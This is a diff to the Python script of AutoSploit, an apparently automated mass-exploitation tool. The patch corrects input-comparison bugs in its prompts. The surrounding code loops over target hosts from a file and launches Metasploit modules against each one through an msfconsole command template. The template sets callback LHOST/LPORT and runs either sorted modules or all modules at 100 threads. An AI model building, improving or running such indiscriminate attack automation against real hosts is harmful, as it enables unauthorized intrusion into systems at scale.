@@ -113,15 +113,15 @@ def exploit(query):
 	
 	# We'll give the user the option to run all modules in a 'hail mary' type of attack or allow 
 	# a more directed approach with the sorted modules.	
-	choice = raw_input("\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ")
+	choice = raw_input("\n[" + t.magenta("?") + "]Run sorted or all modules against targets? [S]orted/[A]ll: ").lower()
 	
-	if choice == 's' or 'S':
+	if choice == 's':
 		with open( "hosts.txt", "rb" ) as host_list:
 			for rhosts in host_list:
 				for exploit in sorted_modules:
 					template = "sudo msfconsole -x 'workspace -a %s; setg LHOST %s; setg LPORT %s; setg VERBOSE true; setg THREADS 100; set RHOSTS %s; %s'" % (workspace, local_host, local_port, rhosts, exploit)
 					os.system(template)
-	elif choice == 'a' or 'A':
+	elif choice == 'a':
 		with open( "hosts.txt", "rb" ) as host_list:
 			for rhosts in host_list:
 				for exploit in all_modules:
@@ -302,11 +302,11 @@ def main():
 				if not os.path.isfile("hosts.txt"):
 					targets(True)
 				else:
-					append = raw_input("\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ")
+					append = raw_input("\n[" + t.magenta("?") + "]Append hosts to file or overwrite? [A/O]: ").lower()
 			
-					if append == 'a' or 'A':
+					if append == 'a':
 						targets(False)
-					elif append == 'o' or 'O':
+					elif append == 'o':
 						targets(True)
 					else:
 						print "\n[" + t.red("!") + "]Unhandled Option."
@@ -359,14 +359,14 @@ if __name__=="__main__":
 	if "Active: inactive" in postgresql:
 		print "\n[" + t.red("!") + "]Warning. Hueristics indicate Postgresql Service is offline"
 
-		start_pst = raw_input("\n[" + t.magenta("?") + "]Start Postgresql Service? [Y]es/[N]o: ")
-		if start_pst == 'y' or 'Y':
+		start_pst = raw_input("\n[" + t.magenta("?") + "]Start Postgresql Service? [Y]es/[N]o: ").lower()
+		if start_pst == 'y':
 			os.system("sudo service postgresql start")
 		
 			print "[" + t.green("+") + "]Postgresql Service Started..."
 			time.sleep(1.5)
 		
-		elif start_pst == 'n' or 'N':
+		elif start_pst == 'n':
 			print "\n[" + t.red("!") + "]AutoSploit's MSF related operations require this service to be active."
 			print "[" + t.red("!") + "]Aborted."
 			time.sleep(1.5)
@@ -382,14 +382,14 @@ if __name__=="__main__":
 	if "Active: inactive" in apache:
 		print "\n[" + t.red("!") + "]Warning. Hueristics indicate Apache Service is offline"
 		
-		start_ap = raw_input("\n[" + t.magenta("?") + "]Start Apache Service? [Y]es/[N]o: ")
-		if start_ap == 'y' or 'Y':
+		start_ap = raw_input("\n[" + t.magenta("?") + "]Start Apache Service? [Y]es/[N]o: ").lower()
+		if start_ap == 'y':
 			os.system("sudo service apache2 start")
 		
 			print "[" + t.green("+") + "]Apache2 Service Started..."
 			time.sleep(1.5)
 		
-		elif start_ap == 'n' or 'N':
+		elif start_ap == 'n':
 			print "\n[" + t.red("!") + "]AutoSploit's MSF related operations require this service to be active."
 			print "[" + t.red("!") + "]Aborted."
 			time.sleep(1.5)
